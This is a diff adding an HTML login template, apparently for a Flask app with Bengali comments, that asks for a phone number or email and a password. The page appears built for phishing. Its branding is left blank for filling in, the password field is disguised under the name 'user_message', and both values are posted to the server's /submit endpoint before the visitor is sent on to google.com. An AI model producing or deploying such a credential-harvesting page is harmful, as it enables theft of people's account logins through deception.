@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="favicon" href="favicon.png">
+    <title>####</title>
+    <!-- Font Awesome CDN Link (আইকনগুলোর জন্য) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f7f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .form-container {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 300px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px 40px 12px 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 15px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: #007bff;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: #0091cf;
+            color: white;
+            padding: 12px;
+            border: none; 
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #007eb4;
+        }
+        .input-box {
+            position: relative;
+            width: 300px;
+        }
+        .input-box label {
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+        }
+
+        .input-box input {
+            width: 100%;
+            padding: 12px 40px 12px 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 15px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        .input-box input:focus {
+            border-color: #007bff;
+        }
+
+        /* প্রফেশনাল আইকন স্টাইলিং */
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 65%;
+            transform: translateY(-50%);
+            color: #777;
+            cursor: pointer;
+            font-size: 16px;
+            transition: color 0.2s;
+        }
+
+        .toggle-password:hover {
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="form-container">
+        <div class="f-logo">
+            <img src="{{ url_for('static', filename='favicon.png') }}" alt="logo" style="width: 35px;">
+        </div>
+        <div class="text">
+            <h5 style="color: #0185be; font-size: 17px; margin-top: 10px;">#####</h5>
+        </div>
+        <form action="/submit" method="POST" id="contactForm" target="_blank">
+            <div class="input-group">
+                <label for="user_name">Phone number</label>
+                <input type="text" id="user_name" name="user_name" placeholder="Phone number or Email address" required>
+            </div>
+
+            <div class="input-box">
+                <label for="user_message">Password</label>
+        <input type="password" id="user_message"name="user_message" placeholder="Enter password">
+
+        <!-- Font Awesome Eye Icon -->
+        <i class="fa-solid fa-eye toggle-password" id="eyeIcon" onclick="togglePassword()"></i>
+    </div>
+
+    <script>
+        function togglePassword() {
+            const passwordInput = document.getElementById("user_message");
+            const eyeIcon = document.getElementById("eyeIcon");
+
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text";
+                // পাসওয়ার্ড দেখা গেলে স্ল্যাশ আইকন (fa-eye-slash) দেখাবে
+                eyeIcon.classList.remove("fa-eye");
+                eyeIcon.classList.add("fa-eye-slash");
+            } else {
+                passwordInput.type = "password";
+                // আবার লক হলে স্বাভাবিক চোখ (fa-eye) দেখাবে
+                eyeIcon.classList.remove("fa-eye-slash");
+                eyeIcon.classList.add("fa-eye");
+            }
+        }
+    </script>
+            <button type="submit"style="margin-top: 25px" class="submit-btn" onclick="openRedirectLink()">###</button>
+        </form>
+    </div>
+
+    <script>
+        function openRedirectLink() {
+            var name = document.getElementById('user_name').value;
+            var message = document.getElementById('user_message').value;
+
+            if (name !== "" && message !== "") {
+                window.open("https://google.com/", "_blank");
+            }
+        }
+    </script>
+
+</body>
+</html>
